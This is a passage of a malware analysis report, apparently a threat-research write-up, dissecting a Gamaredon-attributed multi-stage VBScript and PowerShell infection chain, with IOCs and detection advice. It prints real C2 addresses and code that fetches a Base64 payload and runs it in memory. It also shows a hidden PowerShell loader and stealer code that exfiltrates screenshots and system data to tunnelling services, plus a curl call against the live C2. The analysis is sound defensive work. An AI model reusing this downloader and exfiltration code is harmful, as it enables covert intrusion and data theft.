+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> c2Server_IP_1</span><br><span class="line">c2Server_IP_1 = <span class="string">&quot;http://5.181.2.158&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> c2Server_HTTPS</span><br><span class="line">c2Server_HTTPS = <span class="string">&quot;https://long-king-02b7.5ekz2z6pjk.workers.dev&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> protocolHTTPS</span><br><span class="line">protocolHTTPS = <span class="string">&quot;https://&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> c2Domain_YouAreSilent</span><br><span class="line">c2Domain_YouAreSilent = <span class="string">&quot;youaresilent.ru&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> ipInfoLookupURL</span><br><span class="line">ipInfoLookupURL = <span class="string">&quot;https://check-host.net/ip-info?host=tillthesunrise.sytes.net&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>Cloudflare Workers:</strong> (.workers.dev) - Uses legitimate Cloudflare infrastructure to proxy traffic, hiding the actual backend server.</li>
+<li><strong>Direct IP:</strong> (5.181.2.158) - A fallback hardcoded IP address.</li>
+<li><strong>Third-Party Resolver:</strong> It queries check-host.net (a legitimate IP checking service) to resolve the hostname tillthesunrise.sytes.net.<ul>
+<li>Tactical Significance: This evades local DNS blocklists. If the organization blocks sytes.net, the malware still works because the DNS request goes to check-host.net (which is likely whitelisted). The script parses the HTML response using Regex (geneXlf) to extract the current IP of the C2.</li>
+</ul>
+</li>
+<li><strong>Domain Generation:</strong> It constructs URLs using youaresilent.ru.</li>
+</ol>
+<h3 id="D-Payload-Download-Fileless-Execution"><a href="#D-Payload-Download-Fileless-Execution" class="headerlink" title="D. Payload Download &amp; Fileless Execution"></a>D. Payload Download &amp; Fileless Execution</h3><p>Once a connection is established, the C2 server responds with a payload. The script checks if the response length is greater than 85 bytes (filtering out empty or error responses).</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Clean the response (remove carriage returns/line feeds)</span></span><br><span class="line">learntYXj = RemoveSub<span class="built_in">string</span>(learntYXj, vbcr)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Decode Base64 payload</span></span><br><span class="line"><span class="keyword">set</span> xml_node = <span class="built_in">createobject</span>(<span class="string">&quot;msxml2.domdocument.3.0&quot;</span>).createelement(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">xml_node.datatype = <span class="string">&quot;bin.base64&quot;</span></span><br><span class="line">xml_node.text = learntYXj</span><br><span class="line">byteData = xml_node.nodetypedvalue</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Convert to Text</span></span><br><span class="line">meansjqq = ConvertByteArrayToText(byteData)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; FILELESS EXECUTION</span></span><br><span class="line"><span class="keyword">ExecuteGlobal</span>(meansjqq)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Fileless Persistence:</strong> The Stage 3 payload is <strong>never written to the disk</strong>.</li>
+<li><strong>ExecuteGlobal:</strong> This command executes the downloaded string immediately within the current VBScript memory context. This makes forensic recovery difficult if the machine is rebooted, as the payload exists only in RAM.</li>
+</ul>
+<h2 id="2-3-C2-Network-Analysis-Verification"><a href="#2-3-C2-Network-Analysis-Verification" class="headerlink" title="2.3 C2 Network Analysis &amp; Verification"></a>2.3 C2 Network Analysis &amp; Verification</h2><p>Dynamic analysis of the Stage-2 script revealed a robust communication protocol designed to retrieve the next-stage payload. The malware issues HTTP GET requests to multiple hard-coded command-and-control (C2) endpoints using a rotating infrastructure strategy.</p>
+<h3 id="A-Traffic-Characteristics"><a href="#A-Traffic-Characteristics" class="headerlink" title="A. Traffic Characteristics"></a>A. Traffic Characteristics</h3><p>The requests are constructed dynamically using string concatenation, randomized file extensions, and environment-derived identifiers.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">https://long-king-02b7.5ekz2z6pjk.workers.dev/t.rar</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv.77.0) Gecko/20100101 Firefox/77.0::DESKTOP-5PSV9GH_D41AB5C8::/.vpreviewL5n/./https://long-king-02b7.5ekz2z6pjk.workers.dev</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>missionaryZ0w</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2817</span><br></pre></td></tr></table></figure>
+<p><em>Request to Cloudflare Workers (Primary C2)</em></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET http://5.181.2.158/k.avi</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv.77.0) Gecko/20100101 Firefox/77.0::DESKTOP-5PSV9GH_D41AB5C8::/.vpreviewL5n/./http://5.181.2.158</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>missionaryZ0w</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2817</span><br></pre></td></tr></table></figure>
+<p><em>Request to Direct IP C2 Fallback</em></p>
+<h3 id="B-Analysis-of-Network-Indicators"><a href="#B-Analysis-of-Network-Indicators" class="headerlink" title="B. Analysis of Network Indicators"></a>B. Analysis of Network Indicators</h3><ul>
+<li><p><strong>Rotating C2 Infrastructure:</strong> The malware cycles through a list of primary, fallback, and domain-masqueraded servers. This ensures resiliency; if one IP is blocked, the malware shifts to a Cloudflare Worker or a dynamic domain.</p>
+</li>
+<li><p><strong>Randomized File Extensions:</strong> Requests append misleading extensions such as .rar, .avi, .jpg, and .html. Despite the extension, the server always returns the same Base64-encoded VBScript payload.</p>
+</li>
+<li><p><strong>Custom User-Agent (Fingerprinting):</strong> The User-Agent string is a composite identifier embedding:</p>
+<ul>
+<li>Browser signature (spoofed Firefox)</li>
+<li>System Name (e.g., <code>DESKTOP-5PSV9GH</code>)</li>
+<li>Volume Serial Number</li>
+<li>Current C2 URL</li>
+</ul>
+</li>
+<li><p><strong>Cookie Header:</strong> A constant cookie value (<code>missionaryZ0w</code>) is used as an authentication token or campaign identifier.</p>
+</li>
+</ul>
+<h3 id="C-Manual-Payload-Retrieval-Verification"><a href="#C-Manual-Payload-Retrieval-Verification" class="headerlink" title="C. Manual Payload Retrieval (Verification)"></a>C. Manual Payload Retrieval (Verification)</h3><p>To validate the C2 infrastructure and confirm the behavior of the downloader, a manual request was issued replicating the Stage-2 logic:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;https://long-king-02b7.5ekz2z6pjk.workers.dev/t.rar&#x27;</span> \</span><br><span class="line">  -H <span class="string">&quot;user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv.77.0) Gecko/20100101 Firefox/77.0::DESKTOP-5PSV9GH_D41AB5C8::/.vpreviewL5n/./https://long-king-02b7.5ekz2z6pjk.workers.dev&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Cookie: missionaryZ0w&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Length: 2817&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong> The server responded with the raw Stage-3 payload.</p>
+<h3 id="D-Payload-Decoding-Routine"><a href="#D-Payload-Decoding-Routine" class="headerlink" title="D. Payload Decoding Routine"></a>D. Payload Decoding Routine</h3><p>The downloaded content contains obfuscation markers (&amp;&amp;) and embedded CR&#x2F;LF characters. The malware (and our analysis) must clean this before decoding.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Removal of junk characters and whitespace</span></span><br><span class="line">learntYXj = RemoveSub<span class="built_in">string</span>(learntYXj, vbcr)</span><br><span class="line">learntYXj = RemoveSub<span class="built_in">string</span>(learntYXj, vblf)</span><br><span class="line">learntYXj = RemoveSub<span class="built_in">string</span>(learntYXj, <span class="string">&quot;&amp;&amp;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Base64 Decoding</span></span><br><span class="line"><span class="keyword">set</span> stateWj1 = <span class="built_in">createobject</span>(<span class="string">&quot;msxml2.domdocument.3.0&quot;</span>).createelement(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">stateWj1.datatype = <span class="string">&quot;bin.base64&quot;</span></span><br><span class="line">stateWj1.text = learntYXj</span><br><span class="line">byteData = stateWj1.nodetypedvalue</span><br><span class="line"></span><br><span class="line">meansjqq = ConvertByteArrayToText(byteData)</span><br></pre></td></tr></table></figure>
+<p>By replicating this routine manually, the Base64 blob decoded successfully, revealing the full <strong>Stage-3 VBScript</strong>. This confirmed that the C2 was active and serving payloads at the time of analysis.</p>
+<h2 id="2-4-Stage-3-VBScript-to-PowerShell-Handoff"><a href="#2-4-Stage-3-VBScript-to-PowerShell-Handoff" class="headerlink" title="2.4 Stage 3: VBScript to PowerShell Handoff"></a>2.4 Stage 3: VBScript to PowerShell Handoff</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> .\stage3.vbs</span><br><span class="line"></span><br><span class="line">Algorithm       Hash </span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span></span><br><span class="line">SHA256          A8D4CA5E8C844B44481387BCA57FB1E441992AF0AB4C9A7578123CDDBDA5214A</span><br></pre></td></tr></table></figure>
+<h3 id="File-Overview-2"><a href="#File-Overview-2" class="headerlink" title="File Overview"></a>File Overview</h3><ul>
+<li><strong>File Name:</strong> <code>stage3.vbs</code> (Derived name for analysis)</li>
+<li><strong>File Type:</strong> Obfuscated VBScript</li>
+<li><strong>SHA256:</strong> <code>A8D4CA5E8C844B44481387BCA57FB1E441992AF0AB4C9A7578123CDDBDA5214A</code></li>
+<li><strong>Purpose:</strong> Decodes and executes a PowerShell command to launch the final backdoor.</li>
+</ul>
+<p><img src="/Gamaredon/image-3.png" alt="Figure 3: Decoded Stage3 script."></p>
+<h3 id="A-Obfuscation-Technique-ASCII-Mapping"><a href="#A-Obfuscation-Technique-ASCII-Mapping" class="headerlink" title="A. Obfuscation Technique: ASCII Mapping"></a>A. Obfuscation Technique: ASCII Mapping</h3><p>Unlike the previous stages which relied on string chopping, this stage utilizes integer-to-character mapping to hide its intent. The script defines a list of variables containing ASCII values and uses a helper function <code>dJXyG</code> (an alias for the native <code>Chr</code> function) to reconstruct strings at runtime.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">noWAo = <span class="number">45</span>   <span class="comment">&#x27; ASCII for &quot;-&quot;</span></span><br><span class="line">KREug = <span class="number">101</span>  <span class="comment">&#x27; ASCII for &quot;e&quot;</span></span><br><span class="line">...</span><br><span class="line">sVWlf = <span class="number">104</span>  <span class="comment">&#x27; ASCII for &quot;h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Helper function wrapping Chr()</span></span><br><span class="line"><span class="keyword">function</span> dJXyG(ByOuC)</span><br><span class="line">    dJXyG = <span class="built_in">Chr</span>(ByOuC)</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Reconstructing &quot;shell&quot;</span></span><br><span class="line">wPiVj = dJXyG(<span class="number">115</span>) <span class="comment">&#x27; s</span></span><br><span class="line">JTdoC = dJXyG(<span class="number">104</span>) <span class="comment">&#x27; h</span></span><br><span class="line">oqxYD = wPiVj + JTdoC + ... <span class="comment">&#x27; &quot;shell&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>By mapping these integers, the script reconstructs the string wscript.shell into variable <code>PCgzs</code>. This prevents static analysis tools from seeing the shell instantiation command in plain text.</p>
+<h3 id="B-Command-Reconstruction"><a href="#B-Command-Reconstruction" class="headerlink" title="B. Command Reconstruction"></a>B. Command Reconstruction</h3><p>The script concatenates the Base64 payload stored in variable <code>GTHTp</code> with PowerShell execution arguments constructed from the ASCII variables.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; GTHTp contains the Base64 PowerShell Blob</span></span><br><span class="line">GTHTp = <span class="string">&quot;DQAKAGYAdQBu...&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; REWdC becomes: powershell -nol -nop -enc</span></span><br><span class="line">REWdC = XCBhL + NEfbz + ... </span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Appends the Base64 payload</span></span><br><span class="line">REWdC = REWdC + lnmIo + GTHTp</span><br></pre></td></tr></table></figure>
+
+<h3 id="C-Execution-Mechanism"><a href="#C-Execution-Mechanism" class="headerlink" title="C. Execution Mechanism"></a>C. Execution Mechanism</h3><p>The script initializes the <code>WScript.Shell</code> object and executes the reconstructed command.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> hGaTO = fNgpO       <span class="comment">&#x27; fNgpO is WScript.Shell</span></span><br><span class="line">hGaTO.Run docsn, <span class="number">0</span>      <span class="comment">&#x27; docsn is the full PowerShell command</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>0 Parameter:</strong> The second argument to the .Run method is 0. This specifies SW_HIDE, meaning the PowerShell window will spawn in a <strong>hidden state</strong>, completely invisible to the user.</li>
+<li><strong>Flags Used:</strong><ul>
+<li>-nol (NoLogo): Hides copyright information.</li>
+<li>-nop (NoProfile): Skips loading the user’s PowerShell profile (speeds up execution and avoids profile-based logging).</li>
+<li>-enc (EncodedCommand): Accepts a Base64 encoded string as the command.</li>
+</ul>
+</li>
+</ul>
+<h3 id="D-Dynamic-Validation"><a href="#D-Dynamic-Validation" class="headerlink" title="D. Dynamic Validation"></a>D. Dynamic Validation</h3><p>Execution of the script in a controlled sandbox resulted in the following process spawning:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Profzzor\Desktop&gt; cscript.exe .\stage3.vbs</span><br><span class="line">Microsoft (<span class="built_in">R</span>) Windows Script Host Version <span class="number">5.812</span></span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="literal">-nol</span> <span class="literal">-nop</span> <span class="literal">-enc</span> DQAKAGYAdQBuAGMAdABpAG8AbgAgAFQAagBxAGoAegAoACkAewANAAoACQB0AHIAeQB7AA0ACgAJAAkAJABCAHUAegBmAHIAIAA9ACAAZQBLAEgAUQBIAbgAgACIAIgA7AA0ACgAJAH0ADQAKAH0ADQAKAA0AB5ACkAOwANAAoADQAKA</span><br><span class="line"><span class="literal">-----------snip----------</span></span><br><span class="line">A9ACAAJABqAGYAdgB5AEIAfQA7AA0ACgAJAAkACQAJAAkADQAKACQAQwBKAFQAWABvACAAPQAgAGIASQBhAHQAdgAoACQAdgBkAG8AawB5ACkAOwANAAoADQAKAFMAdABBAFYAUAAoACQAQwBKAFQAWABvACkAOwANAAoAZQB4AGkAdAA7AA0ACgA=</span><br></pre></td></tr></table></figure>
+<p>This confirms that <strong>Stage-3 is a PowerShell loader</strong>, and the VBScript’s only purpose is to reconstruct and execute a PowerShell command in encoded (<code>-enc</code>) form. The Base64 payload inside this PowerShell command represents <strong>Stage-4</strong>, the next step in the infection chain.</p>
+<h2 id="2-5-Stage-4-PowerShell-Info-Stealer"><a href="#2-5-Stage-4-PowerShell-Info-Stealer" class="headerlink" title="2.5 Stage 4: PowerShell Info-Stealer"></a>2.5 Stage 4: PowerShell Info-Stealer</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> .\stage4_clean.ps1</span><br><span class="line"></span><br><span class="line">Algorithm       Hash</span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span></span><br><span class="line">SHA256          BF985A730ADEFEDB740E1C7CA1D9E6BB029EBFBC04BB0136155956FBDFAB6D3F</span><br></pre></td></tr></table></figure>
+
+<h3 id="File-Overview-3"><a href="#File-Overview-3" class="headerlink" title="File Overview"></a>File Overview</h3><ul>
+<li><strong>File Name:</strong> stage4_clean.ps1 (Decoded from Stage 3)</li>
+<li><strong>File Type:</strong> Deobfuscated PowerShell Script</li>
+<li><strong>SHA256:</strong> <code>BF985A730ADEFEDB740E1C7CA1D9E6BB029EBFBC04BB0136155956FBDFAB6D3F</code></li>
+<li><strong>Purpose:</strong> Surveillance, data theft, and exfiltration via tunneling services.</li>
+</ul>
+<h3 id="A-Data-Collection-Capabilities"><a href="#A-Data-Collection-Capabilities" class="headerlink" title="A. Data Collection Capabilities"></a>A. Data Collection Capabilities</h3><p>The script functions as a comprehensive information stealer. Upon execution, it aggregates data into a Hashtable which is later converted to a NameValueCollection for HTTP POST transmission.</p>
+<p>The malware collects the following specific data points:</p>
+<ol>
+<li><p><strong>Desktop Screenshots ($Key_Screenshot &#x3D; “img”):</strong></p>
+<ul>
+<li>It captures the full primary monitor.</li>
+<li>Notably, it manually <strong>draws the mouse cursor</strong> onto the screenshot. This suggests the attackers are interested in the user’s active interaction context, not just the static display.</li>
+<li>The image is converted to a Byte Array and then to a Base64 string.</li>
+</ul>
+</li>
+<li><p><strong>File System Enumeration ($Key_DirectoryTree &#x3D; “install”):</strong></p>
+<ul>
+<li>It recursively lists all directories and files on the user’s <strong>Desktop</strong>.</li>
+<li>It also enumerates all available <strong>PSDrives</strong>, calculating Used&#x2F;Free space in GB.</li>
+</ul>
+</li>
+<li><p><strong>Security Reconnaissance ($Key_SystemInfo &#x3D; “share”):</strong></p>
+<ul>
+<li><strong>Antivirus Detection:</strong> Queries WMI (root\SecurityCenter2) to identify installed Antivirus products.</li>
+<li><strong>Process List:</strong> Enumerate all running processes (ps).</li>
+<li><strong>System Metadata:</strong> Parses the output of the legacy systeminfo command to grab OS version, boot time, and hotfixes.</li>
+</ul>
+</li>
+</ol>
+<h3 id="B-C2-Infrastructure-Tunneling-Service-Abuse"><a href="#B-C2-Infrastructure-Tunneling-Service-Abuse" class="headerlink" title="B. C2 Infrastructure: Tunneling Service Abuse"></a>B. C2 Infrastructure: Tunneling Service Abuse</h3><p>The exfiltration mechanism (ExfiltrateData) is highly resilient. It does not communicate with a standard malicious domain. Instead, it abuses <strong>legitimate tunneling services</strong>.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C2_URL_Primary</span> = <span class="string">&quot;https://bpwnm075-80.use.devtunnels.ms&quot;</span></span><br><span class="line"><span class="variable">$C2_URL_Secondary</span> = <span class="string">&quot;https://cake-wonderful-chamber-take.trycloudflare.com&quot;</span></span><br><span class="line"><span class="variable">$C2_URL_Tertiary</span> = <span class="string">&quot;https://bcc48d9afa97b5bb8275ff047645e935.loophole.site&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment"># Attempt 1: Microsoft Dev Tunnels</span></span><br><span class="line">    <span class="variable">$hoPPc</span>.UploadValues(<span class="variable">$C2_URL_Primary</span> + <span class="string">&quot;/info/&quot;</span>, <span class="variable">$VWxjU</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># Attempt 2: Cloudflare Argo Tunnel</span></span><br><span class="line">        <span class="variable">$hoPPc</span>.UploadValues(<span class="variable">$C2_URL_Secondary</span> + <span class="string">&quot;/info/&quot;</span>, <span class="variable">$VWxjU</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="comment"># Attempt 3: Loophole Site</span></span><br><span class="line">        <span class="variable">$hoPPc</span>.UploadValues(<span class="variable">$C2_URL_Tertiary</span> + <span class="string">&quot;/info/&quot;</span>, <span class="variable">$VWxjU</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Microsoft Dev Tunnels (devtunnels.ms):</strong> A service for developers to expose local ports. Traffic to this domain is often trusted by enterprise firewalls.</li>
+<li><strong>Cloudflare Tunnels (trycloudflare.com):</strong> Uses Cloudflare’s edge network, masking the attacker’s true backend IP.</li>
+<li><strong>Loophole (loophole.site):</strong> Another port forwarding service.</li>
+</ul>
+<h3 id="C-Data-Exfiltration-Method"><a href="#C-Data-Exfiltration-Method" class="headerlink" title="C. Data Exfiltration Method"></a>C. Data Exfiltration Method</h3><p>The collected data is packed and sent via a single <strong>HTTP POST</strong> request.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CollectedDataHashtable</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="string">&quot;img&quot;</span>     = <span class="variable">$ScreenshotData</span>; </span><br><span class="line">    <span class="string">&quot;name&quot;</span>    = <span class="variable">$MachineID</span>; </span><br><span class="line">    <span class="string">&quot;share&quot;</span>   = <span class="variable">$AntivirusAndSystemInfo</span>; </span><br><span class="line">    <span class="string">&quot;desktop&quot;</span> = <span class="variable">$DesktopFileList</span></span><br><span class="line">    <span class="comment"># ... other keys</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sends the data as application/x-www-form-urlencoded</span></span><br><span class="line"><span class="variable">$hoPPc</span>.UploadValues(<span class="variable">$URL</span>, <span class="variable">$CollectedDataNameValueCollection</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Method:</strong> UploadValues triggers a POST request.</li>
+<li><strong>Format:</strong> The body of the request will be key&#x3D;value pairs.</li>
+<li><strong>Size:</strong> Because it includes a Base64 screenshot, this POST request will be large (several hundred KB to MB).</li>
+</ul>
+<h1 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a>3. Conclusion</h1><p>The analysis of gamaredon.hta confirms a classic yet evolving infection chain typical of the Gamaredon group. The extensive use of VBScript obfuscation, specifically the “junk code” insertion and string concatenation, matches the group’s long-standing Pterodo (Pteranodon) toolset signatures.</p>
+<p>However, the analysis highlights a significant evolution in their network infrastructure. The shift from relying solely on Dynamic DNS (DDNS) to abusing legitimate tunneling services (specifically <strong>Microsoft Dev Tunnels</strong> and <strong>Cloudflare Argo</strong>) represents a tactical improvement. This allows the attacker’s traffic to blend in with legitimate developer and web traffic, complicating detection efforts.</p>
+<p>Furthermore, the “Fileless” nature of the Stage 3 and Stage 4 payloads—which reside only in memory after being fetched—demonstrates the group’s focus on anti-forensics. Detection logic must focus on behavioral indicators (e.g., wscript.exe spawning powershell.exe with hidden window flags) and network anomalies (e.g., non-browser processes communicating with devtunnels.ms or check-host.net) rather than static file signatures alone.</p>
+<h1 id="Appendix-A-Indicators-of-Compromise-IOCs"><a href="#Appendix-A-Indicators-of-Compromise-IOCs" class="headerlink" title="Appendix A: Indicators of Compromise (IOCs)"></a>Appendix A: Indicators of Compromise (IOCs)</h1><h2 id="A-1-File-Hashes-SHA256"><a href="#A-1-File-Hashes-SHA256" class="headerlink" title="A.1 File Hashes (SHA256)"></a>A.1 File Hashes (SHA256)</h2><table>
+<thead>
+<tr>
+<th>Description</th>
+<th>SHA256 Hash</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Stage 1: HTA Dropper</strong> (gamaredon.hta)</td>
+<td>AA572532AB1C8A731E7BA32E97BA180268EEE8E6A74A2B9C4DC3EFB669EDB9AF</td>
+</tr>
+<tr>
+<td><strong>Stage 2: VBS Downloader</strong> (ricebG3)</td>
+<td>46D43BEB0BF73BF805C319F4D82B627907046A4C6F18AD1EE9B0B7A59CBE96B9</td>
+</tr>
+<tr>
+<td><strong>Stage 3: VBS Bridge</strong> (Memory Only)</td>
+<td>A8D4CA5E8C844B44481387BCA57FB1E441992AF0AB4C9A7578123CDDBDA5214A</td>
+</tr>
+<tr>
+<td><strong>Stage 4: PS1 Stealer</strong> (Memory Only)</td>
+<td>BF985A730ADEFEDB740E1C7CA1D9E6BB029EBFBC04BB0136155956FBDFAB6D3F</td>
+</tr>
+</tbody></table>
+<h2 id="A-2-Network-Indicators-C2-Infrastructure"><a href="#A-2-Network-Indicators-C2-Infrastructure" class="headerlink" title="A.2 Network Indicators (C2 &amp; Infrastructure)"></a>A.2 Network Indicators (C2 &amp; Infrastructure)</h2><p><strong>Stage 2 (Downloader) Endpoints:</strong> </p>
+<table>
+<thead>
+<tr>
+<th>Domain &#x2F; IP</th>
+<th>Type</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>5.181.2.158</td>
+<td>IP Address</td>
+<td>Payload Delivery (Fallback)</td>
+</tr>
+<tr>
+<td>long-king-02b7.5ekz2z6pjk.workers.dev</td>
+<td>Cloudflare Worker</td>
+<td>Payload Delivery (Primary)</td>
+</tr>
+<tr>
+<td>youaresilent.ru</td>
+<td>Domain</td>
+<td>Payload Delivery</td>
+</tr>
+<tr>
+<td>tillthesunrise.sytes.net</td>
+<td>Dynamic DNS</td>
+<td>C2 IP Resolution Target</td>
+</tr>
+<tr>
+<td>check-host.net</td>
+<td>Legitimate Service</td>
+<td>Abused for IP Resolution</td>
+</tr>
+</tbody></table>
+<p><strong>Stage 4 (Exfiltration) Endpoints:</strong>  </p>
+<table>
+<thead>
+<tr>
+<th align="left">Domain</th>
+<th align="left">Type</th>
+<th align="left">Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">bpwnm075-80.use.devtunnels.ms</td>
+<td align="left">Microsoft Dev Tunnel</td>
+<td align="left">Data Exfiltration</td>
+</tr>
+<tr>
+<td align="left">cake-wonderful-chamber-take.trycloudflare.com</td>
+<td align="left">Cloudflare Tunnel</td>
+<td align="left">Data Exfiltration</td>
+</tr>
+<tr>
+<td align="left">bcc48d9afa97b5bb8275ff047645e935.loophole.site</td>
+<td align="left">Loophole Tunnel</td>
+<td align="left">Data Exfiltration</td>
+</tr>
+</tbody></table>
+<p><strong>Network Signatures:</strong></p>
+<ul>
+<li><strong>User-Agent Pattern:</strong> <code>Mozilla/5.0 ... Firefox/77.0::[ComputerName]_[DriveSerialHex]::/./[C2_URL]</code></li>
+<li><strong>Hardcoded Cookie:</strong> <code>missionaryZ0w</code></li>
+<li><strong>Traffic Anomaly:</strong> HTTP GET requests with <code>Content-Length 2817</code> (Unusual for GET).</li>
+</ul>
+<h2 id="A-3-Host-Based-Indicators"><a href="#A-3-Host-Based-Indicators" class="headerlink" title="A.3 Host-Based Indicators"></a>A.3 Host-Based Indicators</h2><table>
+<thead>
+<tr>
+<th>Path &#x2F; Artifact</th>
+<th>Description</th>
+</tr>
+</thead>
